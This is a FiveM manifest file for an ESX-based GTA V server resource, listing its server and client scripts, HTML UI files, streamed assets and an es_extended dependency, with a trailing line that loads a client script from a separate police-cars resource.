fx_version 'adamant'

game 'gta5'


server_scripts {
	'@async/async.lua',
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/*.lua',
	'config.lua',
	'server/*.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/*.lua',
	'config.lua',
	'client/*.lua',
}

ui_page('client/html/UI.html')

files({
    'client/html/UI.html',
    'client/html/css/*.css',
	'client/html/images/*.png',
	'client/html/images/*.svg',
	'client/html/scripts/*.js',
	'client/html/sounds/*.mp3',
	'stream/*.ytyp'
})

data_file 'DLC_ITYP_REQUEST' 'stream/*.ytyp'

dependencies {
	'es_extended',
}

client_script '@sattiva_police_cars/client.lua'